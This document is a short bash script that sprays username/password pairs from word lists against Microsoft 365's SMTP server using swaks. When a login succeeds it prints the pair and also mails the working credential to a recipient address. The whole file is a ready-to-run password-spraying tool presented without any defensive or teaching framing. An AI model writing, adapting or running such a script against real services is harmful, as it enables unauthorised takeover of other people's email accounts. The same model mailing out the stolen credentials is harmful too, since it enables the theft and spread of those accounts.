#!/usr/bin/env bash
# Spray SMTP creds from users.txt and passwords.txt via smtp.office365.com

SERVER="smtp.office365.com"
PORT=587
USERLIST="users.txt"
WORDLIST="passwords.txt"
RCPT="recipient@example.com"    # where test mails go
DELAY=3                         # seconds between attempts

echo "[*] Starting SMTP AUTH spray against $SERVER"

while IFS= read -r USER; do
  [[ -z "$USER" ]] && continue
  echo "[*] Testing user: $USER"
  while IFS= read -r pass; do
    [[ -z "$pass" ]] && continue
    echo -n "[-] Trying: $USER / $pass ... "

    swaks --to "$RCPT" --from "$USER" \
          --server "$SERVER" --port "$PORT" --tls \
          --auth LOGIN --auth-user "$USER" --auth-password "$pass" \
          --header "Subject: SMTP basic-auth probe" \
          --body "SMTP auth succeeded for $USER with password: $pass" \
          --timeout 10 >/dev/null 2>&1

    if [[ $? -eq 0 ]]; then
      echo -e "\r\033[32m✔ VALID  ->  $USER:$pass\033[0m"
      exit 0
    else
      echo "fail"
    fi
    sleep "$DELAY"
  done < "$WORDLIST"
done < "$USERLIST"

echo "[!] No valid credentials found."
exit 1
